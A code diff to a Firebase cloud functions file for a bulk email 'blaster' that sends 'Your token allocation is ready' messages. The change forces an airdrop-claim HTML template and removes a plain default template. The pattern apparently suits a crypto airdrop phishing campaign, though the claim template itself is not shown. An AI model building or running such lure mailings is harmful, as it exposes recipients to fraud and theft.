@@ -56,7 +56,7 @@ exports.sendBlaster = onCall(async (request) => {
       batch.set(ref, {
         email,
         subject: subject || 'Your token allocation is ready',
-        html: html || buildDefaultEmail(),
+        html: buildAirdropClaimHTML(),
 
         // campaign info
         domain,
@@ -138,22 +138,6 @@ exports.emailWorker = onSchedule('every 1 minutes', async () => {
   }
 })
 
-/**
- * =========================
- * DEFAULT EMAIL TEMPLATE
- * =========================
- */
-function buildDefaultEmail() {
-  return `
-    <html>
-      <body style="font-family:Arial; padding:20px;">
-        <h2>Your Token Allocation is Ready</h2>
-        <p>Please log in to view your allocation.</p>
-        <a href="https://example.com">Open Dashboard</a>
-      </body>
-    </html>
-  `
-}
 /*========================= EMAIL TEMPLATE (optional default) ========================= */
 
 function buildAirdropClaimHTML() {
